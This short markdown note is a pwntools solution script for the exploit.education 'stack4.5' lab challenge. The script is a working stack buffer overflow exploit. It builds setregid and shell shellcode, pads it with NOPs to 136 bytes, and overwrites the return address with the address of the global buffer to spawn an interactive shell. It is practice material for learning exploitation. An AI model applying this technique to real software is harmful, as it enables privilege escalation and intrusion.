# Comments and pwntools solution
## Waiting for writeup

## Althernative solution with pwntools
```python
  from pwn import *

  elf = ELF('./stack4.5')

  # get the context of the target binary
  context.binary = elf


  shellcraft_regid = shellcraft.setregid()  # setuid(0)
  shellcode = asm(shellcraft_regid + shellcraft.sh())
  print(len(shellcode))

  payload = shellcode
  payload += b'\x90' * (136 - len(shellcode))
  payload += p64(elf.symbols['gbuf'])

  io = process('./stack4.5')
  io.recvuntil(b'Welcome to stack4.5, brought to you by https://exploit.education\n')
  print(payload)
  io.sendline(payload)
  io.interactive()
```